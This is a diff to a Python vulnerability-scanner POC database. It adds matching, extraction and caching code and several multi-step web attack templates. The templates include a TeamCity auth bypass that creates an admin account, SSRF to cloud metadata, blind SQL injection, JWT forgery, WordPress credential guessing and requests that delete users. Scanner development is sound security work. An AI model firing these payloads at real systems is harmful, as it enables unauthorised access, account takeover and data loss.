@@ -3,8 +3,11 @@ Vulnerability POC Database
 Comprehensive CVE/CNVD vulnerability signatures with detection logic
 Inspired by nuclei templates and xray POC structure
 """
+import re
+import threading
+from collections import OrderedDict
 from dataclasses import dataclass, field
-from typing import Any, Callable, Dict, List, Optional, Set
+from typing import Any, Callable, Dict, List, Optional, Set, Tuple
 from enum import Enum
 
 from app.utils.logger import get_logger
@@ -34,6 +37,74 @@ class MatcherType(str, Enum):
     SIZE = "size"
     BINARY = "binary"
     DSL = "dsl"
+    HEADER = "header"
+    TIME = "time"
+    HASH = "hash"
+
+
+class MatcherCondition(str, Enum):
+    AND = "and"
+    OR = "or"
+
+
+class ExtractorType(str, Enum):
+    REGEX = "regex"
+    JSON = "json"
+    XPATH = "xpath"
+    HEADER = "header"
+    COOKIE = "cookie"
+
+
+@dataclass
+class Extractor:
+    type: ExtractorType
+    name: str
+    value: str
+    part: str = "body"
+    _compiled_regex: Any = field(default=None, repr=False, init=False)
+
+    def __post_init__(self):
+        if self.type == ExtractorType.REGEX:
+            try:
+                self._compiled_regex = re.compile(self.value, re.IGNORECASE | re.DOTALL)
+            except re.error:
+                self._compiled_regex = None
+
+    def extract(self, response: Any) -> Optional[str]:
+        try:
+            if self.type == ExtractorType.REGEX:
+                if self._compiled_regex is None:
+                    return None
+                text = getattr(response, self.part, "") or ""
+                if isinstance(text, bytes):
+                    text = text.decode("utf-8", errors="replace")
+                match = self._compiled_regex.search(text)
+                return match.group(1) if match and match.groups() else (match.group(0) if match else None)
+            elif self.type == ExtractorType.HEADER:
+                headers = getattr(response, "headers", {}) or {}
+                return headers.get(self.value, None)
+            elif self.type == ExtractorType.COOKIE:
+                cookies = getattr(response, "cookies", {}) or {}
+                return cookies.get(self.value, None)
+            elif self.type == ExtractorType.JSON:
+                text = getattr(response, self.part, "") or ""
+                if isinstance(text, bytes):
+                    text = text.decode("utf-8", errors="replace")
+                try:
+                    import json
+                    data = json.loads(text)
+                    for key in self.value.split("."):
+                        if isinstance(data, dict):
+                            data = data.get(key)
+                        elif isinstance(data, list) and key.isdigit():
+                            data = data[int(key)] if int(key) < len(data) else None
+                        else:
+                            return None
+                    return str(data) if data is not None else None
+                except Exception:
+                    return None
+        except Exception:
+            return None
 
 
 @dataclass
@@ -43,6 +114,14 @@ class Matcher:
     part: str = "body"
     condition: str = "and"
     negative: bool = False
+    _compiled_regex: Any = field(default=None, repr=False, init=False)
+
+    def __post_init__(self):
+        if self.type == MatcherType.REGEX:
+            try:
+                self._compiled_regex = re.compile(self.value, re.IGNORECASE | re.DOTALL)
+            except re.error:
+                self._compiled_regex = None
 
     def match(self, response: Any) -> bool:
         try:
@@ -54,20 +133,55 @@ class Matcher:
                     text = text.decode("utf-8", errors="replace")
                 result = str(self.value) in text
             elif self.type == MatcherType.REGEX:
-                import re
+                if self._compiled_regex is None:
+                    return False
                 text = getattr(response, self.part, "") or ""
                 if isinstance(text, bytes):
                     text = text.decode("utf-8", errors="replace")
-                result = bool(re.search(self.value, text, re.IGNORECASE | re.DOTALL))
+                result = bool(self._compiled_regex.search(text))
             elif self.type == MatcherType.SIZE:
                 body = getattr(response, "body", b"") or b""
                 result = len(body) == self.value
+            elif self.type == MatcherType.HEADER:
+                headers = getattr(response, "headers", {}) or {}
+                header_value = headers.get(self.part, "")
+                if isinstance(self.value, str):
+                    result = self.value in str(header_value)
+                else:
+                    result = header_value == self.value
+            elif self.type == MatcherType.TIME:
+                elapsed = getattr(response, "elapsed", 0) or 0
+                result = elapsed >= self.value
+            elif self.type == MatcherType.HASH:
+                import hashlib
+                body = getattr(response, "body", b"") or b""
+                if isinstance(body, str):
+                    body = body.encode("utf-8")
+                computed = hashlib.md5(body).hexdigest()
+                result = computed == self.value
             else:
                 result = False
 
             return not result if self.negative else result
         except Exception:
             return False
+
+
+@dataclass
+class MatcherGroup:
+    matchers: List[Matcher] = field(default_factory=list)
+    condition: MatcherCondition = MatcherCondition.AND
+    negative: bool = False
+
+    def match(self, response: Any) -> bool:
+        if not self.matchers:
+            return False
+        results = [m.match(response) for m in self.matchers]
+        if self.condition == MatcherCondition.AND:
+            result = all(results)
+        else:
+            result = any(results)
+        return not result if self.negative else result
 
 
 @dataclass
@@ -101,52 +215,237 @@ class POC:
     poc_type: POCType = POCType.HTTP
     requests: List[POCRequest] = field(default_factory=list)
     matchers: List[Matcher] = field(default_factory=list)
+    matcher_groups: List[MatcherGroup] = field(default_factory=list)
+    matchers_condition: MatcherCondition = MatcherCondition.AND
+    extractors: List[Extractor] = field(default_factory=list)
     references: List[str] = field(default_factory=list)
     fix_suggestion: str = ""
     disclosure_date: str = ""
 
     def match(self, response: Any) -> bool:
+        if self.matcher_groups:
+            group_results = [g.match(response) for g in self.matcher_groups]
+            if self.matchers_condition == MatcherCondition.AND:
+                return all(group_results)
+            else:
+                return any(group_results)
+
         if not self.matchers:
             return False
         results = [m.match(response) for m in self.matchers]
-        return all(results)
+        if self.matchers_condition == MatcherCondition.AND:
+            return all(results)
+        else:
+            return any(results)
+
+    def extract(self, response: Any) -> Dict[str, str]:
+        extracted = {}
+        for extractor in self.extractors:
+            value = extractor.extract(response)
+            if value is not None:
+                extracted[extractor.name] = value
+        return extracted
+
+    def interpolate(self, template: str, variables: Dict[str, str]) -> str:
+        result = template
+        for name, value in variables.items():
+            result = result.replace(f"{{{{{name}}}}}", value)
+        return result
+
+    def get_requests(self, variables: Optional[Dict[str, str]] = None) -> List[POCRequest]:
+        if not variables:
+            return list(self.requests)
+        interpolated = []
+        for req in self.requests:
+            new_req = POCRequest(
+                method=req.method,
+                path=self.interpolate(req.path, variables),
+                headers={k: self.interpolate(v, variables) for k, v in req.headers.items()},
+                body=self.interpolate(req.body, variables) if req.body else None,
+            )
+            interpolated.append(new_req)
+        return interpolated
 
 
 POC_DATABASE: Dict[str, POC] = {}
+_tag_index: Dict[str, Set[str]] = {}
+_cve_index: Dict[str, Set[str]] = {}
+_risk_index: Dict[RiskLevel, Set[str]] = {}
+_index_lock = threading.RLock()
+_index_built = False
+
+
+class LRUCache:
+    def __init__(self, max_size: int = 512):
+        self._cache: OrderedDict = OrderedDict()
+        self._max_size = max_size
+        self._lock = threading.Lock()
+
+    def get(self, key: str) -> Optional[Any]:
+        with self._lock:
+            if key in self._cache:
+                self._cache.move_to_end(key)
+                return self._cache[key]
+            return None
+
+    def put(self, key: str, value: Any):
+        with self._lock:
+            if key in self._cache:
+                self._cache.move_to_end(key)
+            self._cache[key] = value
+            while len(self._cache) > self._max_size:
+                self._cache.popitem(last=False)
+
+    def clear(self):
+        with self._lock:
+            self._cache.clear()
+
+    def __len__(self) -> int:
+        return len(self._cache)
+
+
+_poc_lookup_cache = LRUCache(max_size=1024)
+_match_result_cache = LRUCache(max_size=2048)
+
+
+def _build_indexes():
+    global _index_built
+    with _index_lock:
+        if _index_built:
+            return
+        _tag_index.clear()
+        _cve_index.clear()
+        _risk_index.clear()
+        for poc_id, poc in POC_DATABASE.items():
+            for tag in poc.tags:
+                _tag_index.setdefault(tag, set()).add(poc_id)
+            for cve in poc.cve_ids:
+                _cve_index.setdefault(cve, set()).add(poc_id)
+            _risk_index.setdefault(poc.risk_level, set()).add(poc_id)
+        _index_built = True
+        logger.info(f"POC indexes built: {len(_tag_index)} tags, {len(_cve_index)} CVEs, {len(_risk_index)} risk levels")
+
+
+def _invalidate_indexes():
+    global _index_built
+    with _index_lock:
+        _index_built = False
+        _poc_lookup_cache.clear()
+        _match_result_cache.clear()
 
 
 def register_poc(poc: POC):
     POC_DATABASE[poc.id] = poc
+    _invalidate_indexes()
 
 
 def get_poc(poc_id: str) -> Optional[POC]:
-    return POC_DATABASE.get(poc_id)
+    cached = _poc_lookup_cache.get(f"poc:{poc_id}")
+    if cached is not None:
+        return cached
+    poc = POC_DATABASE.get(poc_id)
+    if poc:
+        _poc_lookup_cache.put(f"poc:{poc_id}", poc)
+    return poc
 
 
 def get_pocs_by_tag(tag: str) -> List[POC]:
-    return [p for p in POC_DATABASE.values() if tag in p.tags]
+    cached = _poc_lookup_cache.get(f"tag:{tag}")
+    if cached is not None:
+        return cached
+    if not _index_built:
+        _build_indexes()
+    poc_ids = _tag_index.get(tag, set())
+    result = [POC_DATABASE[pid] for pid in poc_ids if pid in POC_DATABASE]
+    _poc_lookup_cache.put(f"tag:{tag}", result)
+    return result
 
 
 def get_pocs_by_cve(cve_id: str) -> List[POC]:
-    return [p for p in POC_DATABASE.values() if cve_id in p.cve_ids]
+    cached = _poc_lookup_cache.get(f"cve:{cve_id}")
+    if cached is not None:
+        return cached
+    if not _index_built:
+        _build_indexes()
+    poc_ids = _cve_index.get(cve_id, set())
+    result = [POC_DATABASE[pid] for pid in poc_ids if pid in POC_DATABASE]
+    _poc_lookup_cache.put(f"cve:{cve_id}", result)
+    return result
 
 
 def get_pocs_by_risk(level: RiskLevel) -> List[POC]:
-    return [p for p in POC_DATABASE.values() if p.risk_level == level]
+    cached = _poc_lookup_cache.get(f"risk:{level.value}")
+    if cached is not None:
+        return cached
+    if not _index_built:
+        _build_indexes()
+    poc_ids = _risk_index.get(level, set())
+    result = [POC_DATABASE[pid] for pid in poc_ids if pid in POC_DATABASE]
+    _poc_lookup_cache.put(f"risk:{level.value}", result)
+    return result
+
+
+def get_pocs_by_tags(tags: List[str], match_all: bool = False) -> List[POC]:
+    cache_key = f"tags:{','.join(sorted(tags))}:{match_all}"
+    cached = _poc_lookup_cache.get(cache_key)
+    if cached is not None:
+        return cached
+    if not _index_built:
+        _build_indexes()
+    if not tags:
+        return []
+    if match_all:
+        result_sets = [_tag_index.get(t, set()) for t in tags]
+        poc_ids = result_sets[0].intersection(*result_sets[1:]) if result_sets else set()
+    else:
+        poc_ids = set()
+        for t in tags:
+            poc_ids.update(_tag_index.get(t, set()))
+    result = [POC_DATABASE[pid] for pid in poc_ids if pid in POC_DATABASE]
+    _poc_lookup_cache.put(cache_key, result)
+    return result
 
 
 def get_all_pocs() -> List[POC]:
     return list(POC_DATABASE.values())
 
 
-def _init_poc_database()
+def match_poc_cached(poc_id: str, response: Any) -> bool:
+    resp_hash = hash(str(response.status) + str(getattr(response, 'body', b'')[:512]))
+    cache_key = f"match:{poc_id}:{resp_hash}"
+    cached = _match_result_cache.get(cache_key)
+    if cached is not None:
+        return cached
+    poc = get_poc(poc_id)
+    if poc is None:
+        return False
+    result = poc.match(response)
+    _match_result_cache.put(cache_key, result)
+    return result
 
-try:
-    from app.core.poc_db_extra import _init_extra_pocs
-    _init_extra_pocs()
-    logger.info("Extra POC signatures loaded successfully")
-except Exception as e:
-    logger.warning(f"Failed to load extra POC signatures: {e}"):
+
+def get_poc_count() -> int:
+    return len(POC_DATABASE)
+
+
+def get_index_stats() -> dict:
+    return {
+        "total_pocs": len(POC_DATABASE),
+        "tags_indexed": len(_tag_index),
+        "cves_indexed": len(_cve_index),
+        "risk_levels_indexed": len(_risk_index),
+        "lookup_cache_size": len(_poc_lookup_cache),
+        "match_cache_size": len(_match_result_cache),
+    }
+
+
+def _init_poc_database():
+    try:
+        from app.core.poc_db_extra import _init_extra_pocs
+        _init_extra_pocs()
+        logger.info("Extra POC signatures loaded successfully")
+    except Exception as e:
+        logger.warning(f"Failed to load extra POC signatures: {e}")
     pocs = [
 
         POC(
@@ -1381,6 +1680,401 @@ except Exception as e:
             ],
             fix_suggestion="升级启明星辰天镜至最新安全版本。",
             disclosure_date="2025-04-25",
+        ),
+        POC(
+            id="multi-step-cve-2024-27198-exploit",
+            name="TeamCity 认证绕过多步利用 (CVE-2024-27198) - 复杂匹配",
+            description="多步请求POC示例：先绕过认证获取token，再创建管理员账户。使用matcher_groups和extractors。",
+            risk_level=RiskLevel.CRITICAL,
+            cve_ids=["CVE-2024-27198"],
+            cvss_score=9.8,
+            tags=["teamcity", "auth-bypass", "rce", "multi-step", "cve-2024"],
+            affected_versions=["TeamCity < 2023.11.4"],
+            requests=[
+                POCRequest(
+                    method="GET",
+                    path="/hax?jsp=/app/rest/users/;.jsp",
+                ),
+                POCRequest(
+                    method="POST",
+                    path="/hax?jsp=/app/rest/users/;.jsp",
+                    headers={"Content-Type": "application/json"},
+                    body='{"username":"poc_test_user","password":"PocTest@123","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}',
+                ),
+            ],
+            matchers=[
+                Matcher(type=MatcherType.STATUS, value=200),
+            ],
+            matcher_groups=[
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="user"),
+                        Matcher(type=MatcherType.STATUS, value=200),
+                    ],
+                    condition=MatcherCondition.AND,
+                ),
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="SYSTEM_ADMIN"),
+                        Matcher(type=MatcherType.WORD, value="poc_test_user"),
+                    ],
+                    condition=MatcherCondition.OR,
+                ),
+            ],
+            matchers_condition=MatcherCondition.OR,
+            extractors=[
+                Extractor(type=ExtractorType.REGEX, name="username", value='"username":"([^"]+)"'),
+                Extractor(type=ExtractorType.HEADER, name="server", value="Server"),
+            ],
+            references=[
+                "https://nvd.nist.gov/vuln/detail/CVE-2024-27198",
+            ],
+            fix_suggestion="升级TeamCity至2023.11.4或更高版本。",
+            disclosure_date="2024-03-04",
+        ),
+
+        POC(
+            id="multi-step-csrf-token-extract",
+            name="CSRF Token提取与多步表单提交 - 复杂匹配示例",
+            description="多步POC示例：先获取页面提取CSRF token，再使用token提交敏感操作。演示extractor变量插值。",
+            risk_level=RiskLevel.MEDIUM,
+            cvss_score=5.5,
+            tags=["csrf", "multi-step", "extractor", "demo"],
+            requests=[
+                POCRequest(
+                    method="GET",
+                    path="/login",
+                ),
+                POCRequest(
+                    method="POST",
+                    path="/admin/delete-user",
+                    headers={"Content-Type": "application/x-www-form-urlencoded"},
+                    body="csrf_token={{csrf_token}}&user_id=1&confirm=yes",
+                ),
+            ],
+            matchers=[
+                Matcher(type=MatcherType.STATUS, value=200),
+            ],
+            matcher_groups=[
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="deleted"),
+                        Matcher(type=MatcherType.STATUS, value=200),
+                    ],
+                    condition=MatcherCondition.AND,
+                ),
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="success"),
+                        Matcher(type=MatcherType.STATUS, value=302),
+                    ],
+                    condition=MatcherCondition.AND,
+                ),
+            ],
+            matchers_condition=MatcherCondition.OR,
+            extractors=[
+                Extractor(type=ExtractorType.REGEX, name="csrf_token",
+                          value='name="csrf_token"[^>]*value="([^"]+)"'),
+                Extractor(type=ExtractorType.HEADER, name="session_id", value="Set-Cookie"),
+            ],
+            references=[
+                "https://owasp.org/www-community/attacks/csrf",
+            ],
+            fix_suggestion="实施CSRF Token保护，验证Referer/Origin头。",
+            disclosure_date="2024-06-01",
+        ),
+
+        POC(
+            id="multi-step-oauth2-token-extract",
+            name="OAuth2 Token提取与API利用 - 复杂匹配示例",
+            description="多步POC示例：从OAuth2响应中提取access_token，用于后续API调用。演示JSON extractor。",
+            risk_level=RiskLevel.HIGH,
+            cvss_score=7.5,
+            tags=["oauth2", "multi-step", "extractor", "api", "demo"],
+            requests=[
+                POCRequest(
+                    method="POST",
+                    path="/oauth/token",
+                    headers={"Content-Type": "application/x-www-form-urlencoded"},
+                    body="grant_type=client_credentials&client_id=test&client_secret=test",
+                ),
+                POCRequest(
+                    method="GET",
+                    path="/api/admin/users",
+                    headers={"Authorization": "Bearer {{access_token}}"},
+                ),
+            ],
+            matchers=[
+                Matcher(type=MatcherType.STATUS, value=200),
+            ],
+            matcher_groups=[
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="users"),
+                        Matcher(type=MatcherType.STATUS, value=200),
+                    ],
+                    condition=MatcherCondition.AND,
+                ),
+            ],
+            matchers_condition=MatcherCondition.AND,
+            extractors=[
+                Extractor(type=ExtractorType.JSON, name="access_token", value="access_token"),
+                Extractor(type=ExtractorType.JSON, name="token_type", value="token_type"),
+            ],
+            references=[
+                "https://oauth.net/2/",
+            ],
+            fix_suggestion="实施严格的OAuth2 scope控制和token过期策略。",
+            disclosure_date="2024-07-01",
+        ),
+
+        POC(
+            id="multi-step-wp-xmlrpc-brute",
+            name="WordPress XML-RPC 暴力破解 - 多步检测",
+            description="多步POC示例：先检测XML-RPC是否启用，再尝试系统级方法调用检测权限问题。",
+            risk_level=RiskLevel.MEDIUM,
+            cvss_score=5.3,
+            tags=["wordpress", "xmlrpc", "multi-step", "brute-force"],
+            affected_versions=["WordPress (XML-RPC enabled)"],
+            requests=[
+                POCRequest(
+                    method="POST",
+                    path="/xmlrpc.php",
+                    headers={"Content-Type": "text/xml"},
+                    body='''<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.listMethods</methodName>
+  <params></params>
+</methodCall>''',
+                ),
+                POCRequest(
+                    method="POST",
+                    path="/xmlrpc.php",
+                    headers={"Content-Type": "text/xml"},
+                    body='''<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+    <param><value><string>admin</string></value></param>
+    <param><value><string>admin</string></value></param>
+  </params>
+</methodCall>''',
+                ),
+            ],
+            matchers=[
+                Matcher(type=MatcherType.STATUS, value=200),
+            ],
+            matcher_groups=[
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="system.listMethods"),
+                        Matcher(type=MatcherType.WORD, value="wp.getUsersBlogs"),
+                    ],
+                    condition=MatcherCondition.AND,
+                ),
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="faultCode"),
+                        Matcher(type=MatcherType.WORD, value="403"),
+                    ],
+                    condition=MatcherCondition.OR,
+                ),
+            ],
+            matchers_condition=MatcherCondition.OR,
+            extractors=[
+                Extractor(type=ExtractorType.REGEX, name="method_count",
+                          value=r"<name>([^<]+)</name>"),
+            ],
+            references=[
+                "https://wordpress.org/documentation/article/xml-rpc/",
+            ],
+            fix_suggestion="如不需要XML-RPC功能，建议禁用它。",
+            disclosure_date="2024-08-01",
+        ),
+
+        POC(
+            id="multi-step-jwt-none-alg",
+            name="JWT None算法攻击 - 多步验证",
+            description="多步POC示例：先获取正常JWT token，再使用None算法伪造token访问受保护资源。",
+            risk_level=RiskLevel.HIGH,
+            cvss_score=7.5,
+            tags=["jwt", "multi-step", "auth-bypass", "algorithm-confusion"],
+            requests=[
+                POCRequest(
+                    method="GET",
+                    path="/api/auth/status",
+                ),
+                POCRequest(
+                    method="GET",
+                    path="/api/admin/config",
+                    headers={"Authorization": "Bearer {{forged_token}}"},
+                ),
+            ],
+            matchers=[
+                Matcher(type=MatcherType.STATUS, value=200),
+            ],
+            matcher_groups=[
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="config"),
+                        Matcher(type=MatcherType.STATUS, value=200),
+                    ],
+                    condition=MatcherCondition.AND,
+                ),
+            ],
+            matchers_condition=MatcherCondition.AND,
+            extractors=[
+                Extractor(type=ExtractorType.HEADER, name="auth_header", value="Authorization"),
+                Extractor(type=ExtractorType.REGEX, name="jwt_token",
+                          value=r"Bearer ([A-Za-z0-9\-_]+?\.[A-Za-z0-9\-_]+?\.[A-Za-z0-9\-_]+)"),
+            ],
+            references=[
+                "https://portswigger.net/web-security/jwt",
+            ],
+            fix_suggestion="明确指定JWT签名算法，拒绝None算法。",
+            disclosure_date="2024-09-01",
+        ),
+
+        POC(
+            id="multi-step-graphql-introspect",
+            name="GraphQL 内省查询与敏感字段探测 - 多步检测",
+            description="多步POC示例：先进行GraphQL内省查询获取schema，再探测敏感mutation字段。",
+            risk_level=RiskLevel.MEDIUM,
+            cvss_score=5.5,
+            tags=["graphql", "multi-step", "info-disclosure", "introspection"],
+            requests=[
+                POCRequest(
+                    method="POST",
+                    path="/graphql",
+                    headers={"Content-Type": "application/json"},
+                    body='{"query":"{__schema{types{name,fields{name,type{name}}}}}","variables":{}}',
+                ),
+                POCRequest(
+                    method="POST",
+                    path="/graphql",
+                    headers={"Content-Type": "application/json"},
+                    body='{"query":"mutation{deleteUser(id:1){success}}","variables":{}}',
+                ),
+            ],
+            matchers=[
+                Matcher(type=MatcherType.STATUS, value=200),
+            ],
+            matcher_groups=[
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="__schema"),
+                        Matcher(type=MatcherType.WORD, value="types"),
+                    ],
+                    condition=MatcherCondition.AND,
+                ),
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="deleteUser"),
+                        Matcher(type=MatcherType.WORD, value="success"),
+                    ],
+                    condition=MatcherCondition.OR,
+                ),
+            ],
+            matchers_condition=MatcherCondition.OR,
+            extractors=[
+                Extractor(type=ExtractorType.JSON, name="schema_types", value="data.__schema.types"),
+            ],
+            references=[
+                "https://graphql.org/learn/introspection/",
+            ],
+            fix_suggestion="在生产环境禁用GraphQL内省查询。",
+            disclosure_date="2024-10-01",
+        ),
+
+        POC(
+            id="multi-step-ssrf-redirect-chain",
+            name="SSRF 重定向链攻击 - 多步检测",
+            description="多步POC示例：利用开放重定向构造SSRF攻击链，绕过URL白名单检测。",
+            risk_level=RiskLevel.HIGH,
+            cvss_score=7.5,
+            tags=["ssrf", "multi-step", "redirect", "bypass"],
+            requests=[
+                POCRequest(
+                    method="GET",
+                    path="/redirect?url=http://169.254.169.254/latest/meta-data/",
+                ),
+                POCRequest(
+                    method="GET",
+                    path="/api/fetch?url={{redirect_target}}",
+                ),
+            ],
+            matchers=[
+                Matcher(type=MatcherType.STATUS, value=200),
+            ],
+            matcher_groups=[
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="ami-id"),
+                        Matcher(type=MatcherType.STATUS, value=200),
+                    ],
+                    condition=MatcherCondition.AND,
+                ),
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="instance-id"),
+                        Matcher(type=MatcherType.STATUS, value=200),
+                    ],
+                    condition=MatcherCondition.AND,
+                ),
+            ],
+            matchers_condition=MatcherCondition.OR,
+            extractors=[
+                Extractor(type=ExtractorType.REGEX, name="redirect_target",
+                          value=r"Location:\s*(https?://[^\s]+)"),
+                Extractor(type=ExtractorType.REGEX, name="ami_id",
+                          value=r"ami-[a-f0-9]+"),
+            ],
+            references=[
+                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
+            ],
+            fix_suggestion="实施严格的URL白名单验证，禁止重定向跟随。",
+            disclosure_date="2024-11-01",
+        ),
+
+        POC(
+            id="multi-step-sql-blind-extract",
+            name="SQL盲注逐字符提取 - 多步检测",
+            description="多步POC示例：先检测SQL注入点，再逐字符提取数据库版本信息。演示复杂多步提取。",
+            risk_level=RiskLevel.HIGH,
+            cvss_score=7.5,
+            tags=["sqli", "multi-step", "blind", "extraction"],
+            requests=[
+                POCRequest(
+                    method="GET",
+                    path="/api/products?id=1' AND '1'='1",
+                ),
+                POCRequest(
+                    method="GET",
+                    path="/api/products?id=1' AND SUBSTRING(VERSION(),1,1)='{{first_char}}",
+                ),
+            ],
+            matchers=[
+                Matcher(type=MatcherType.STATUS, value=200),
+            ],
+            matcher_groups=[
+                MatcherGroup(
+                    matchers=[
+                        Matcher(type=MatcherType.WORD, value="product"),
+                        Matcher(type=MatcherType.STATUS, value=200),
+                    ],
+                    condition=MatcherCondition.AND,
+                ),
+            ],
+            matchers_condition=MatcherCondition.AND,
+            extractors=[
+                Extractor(type=ExtractorType.REGEX, name="first_char",
+                          value=r"version_first_char['\"]\s*:\s*['\"]([^'\"]+)"),
+            ],
+            references=[
+                "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
+            ],
+            fix_suggestion="使用参数化查询，对所有用户输入进行严格过滤。",
+            disclosure_date="2024-12-01",
         ),
     ]
 
